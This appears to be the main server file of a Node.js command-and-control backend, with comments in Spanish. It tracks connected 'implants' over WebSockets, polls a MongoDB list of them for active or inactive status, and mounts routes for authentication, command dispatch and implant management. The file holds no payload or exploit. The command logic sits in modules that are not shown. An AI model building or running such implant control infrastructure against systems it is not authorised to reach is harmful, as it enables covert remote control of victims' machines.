import express from 'express'
import { configDotenv } from 'dotenv';
import authRouter from './routes/auth_routes.mjs';
import helmet from 'helmet';
import { syntax_errors, type_errors } from './middlewares/json_errors.mjs';
import db_connection from './database/config.mjs';
import { WebSocketServer } from 'ws';
import http from 'http'
import cmd_router from './routes/cmd_routes.mjs';
import implant_router from './routes/implant_routes.mjs';
import mongoose from 'mongoose';
import Implant from './models/Implant_model.mjs';


const webSocketsServer = async(httpServer)=>{

    try {
        const server = new WebSocketServer({ server: httpServer });
        const clients = new Map();
    
        server.on('connection', (socket, request) => {
            const url = new URL(request.url, `http://${request.headers.host}`);
            const clientId = url.searchParams.get('id');
    
            if (!clientId) {
                console.log("Cliente sin ID, cerrando");
                socket.close();
                return;
            }
    
            if (clients.has(clientId)) {
                console.log(`Cliente con ID ${clientId} ya conectado. Reemplazando conexión.`);
                clients.get(clientId).terminate();
            }
    
            console.log(`Cliente conectado con ID: ${clientId}`);
            clients.set(clientId, socket);
            socket.isAlive = true;
    
            socket.on('pong', () => socket.isAlive = true);
    

    
            socket.on('close', () => {
                console.log(`Cliente ${clientId} desconectado`);
                clients.get(clientId).isAlive=false;
            });
        });
    
        const interval = setInterval(async() => {
  
            const db_clients = await Implant.find();
            const client_db_list = db_clients.map((x)=>x.impl_id);
            let status_connections = []


            client_db_list.forEach(db_id => {
                // Verificar si el ID está en el Map de WebSockets
                const ws = clients.get(db_id);
                
                if (ws) {
                    // Si la conexión existe, verificar si está activa
                    if (ws.isAlive) {
                        status_connections.push({ id: db_id, status: 'active' });
                    } else {
                        status_connections.push({ id: db_id, status: 'inactive' });
                    }
                } else {
                    // Si el ID no existe en el Map, marcar como inactive
                    status_connections.push({ id: db_id, status: 'inactive' });
                }
            });

            console.log(status_connections);
    

        }, 10000);
    
        server.on("close", () => clearInterval(interval));
        
        return clients;

    } catch (error) {
        console.log(error);
        return false;
    }

    
}

const main = async () =>{
    
    configDotenv();
    const app = express();
    await db_connection();
    
    
    app.use(helmet())
    
    app.use(express.json())
    app.use(express.urlencoded({ extended: true })); // Para formularios HTML
    app.use(express.static('public'));
    const server = http.createServer(app);
    const clients = await webSocketsServer(server)
    
    app.use('/api/auth', authRouter)
    app.use('/api/rcv', cmd_router(clients))
    app.use('/api/impl', implant_router())
    //------Type errors-----
    app.use(type_errors);
    app.use(syntax_errors);
    
    server.listen(process.env.PORT, ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))

}
main()